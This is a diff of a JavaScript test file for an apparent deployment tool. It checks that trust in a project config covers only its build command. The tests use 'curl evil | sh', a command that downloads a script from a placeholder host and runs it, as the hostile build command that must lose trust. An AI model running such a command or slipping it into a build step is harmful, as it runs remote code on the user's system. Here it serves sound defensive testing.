@@ -3,7 +3,7 @@ import assert from "node:assert/strict";
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
-import { configHash, isTrusted, loadUserConfig, parseProjectConfig, trust } from "../src/config.js";
+import { configHash, isTrusted, loadUserConfig, parseProjectConfig, trust, trustHash } from "../src/config.js";
 import { DokployClient } from "../src/dokploy-client.js";
 import { HsError, errorFromHttp } from "../src/errors.js";
 import { mergeEnv, parseEnv } from "../src/env-file.js";
@@ -23,16 +23,17 @@ test("project config: valid, defaults, and clear rejections", () => {
   for (const [obj, re] of bad) assert.throws(() => parseProjectConfig(obj), e => e instanceof HsError && re.test(e.message));
 });
 
-test("config hash is order independent and trust is per path and hash", () => {
+test("config hash is order independent; trust is per path and covers only the build command (D13)", () => {
   const udir = fs.mkdtempSync(path.join(os.tmpdir(), "hsd-trust-"));
   try {
     const a = parseProjectConfig(good);
     assert.equal(configHash(a), configHash(Object.fromEntries(Object.entries(a).reverse())));
-    assert.equal(isTrusted("/proj", configHash(a), udir), false);
-    trust("/proj", configHash(a), udir);
-    assert.equal(isTrusted("/proj", configHash(a), udir), true);
-    assert.equal(isTrusted("/proj", configHash({ ...a, buildCommand: "curl evil | sh" }), udir), false);
-    assert.equal(isTrusted("/other", configHash(a), udir), false);
+    assert.equal(isTrusted("/proj", trustHash(a), udir), false);
+    trust("/proj", trustHash(a), udir);
+    assert.equal(isTrusted("/proj", trustHash(a), udir), true);
+    assert.equal(isTrusted("/proj", trustHash({ ...a, subdomain: "other", port: 9, envFile: ".env.x" }), udir), true, "fields that cannot run code do not need a new approval");
+    assert.equal(isTrusted("/proj", trustHash({ ...a, buildCommand: "curl evil | sh" }), udir), false, "a changed build command does");
+    assert.equal(isTrusted("/other", trustHash(a), udir), false, "trust is bound to the folder");
   } finally { fs.rmSync(udir, { recursive: true, force: true }); }
 });
 
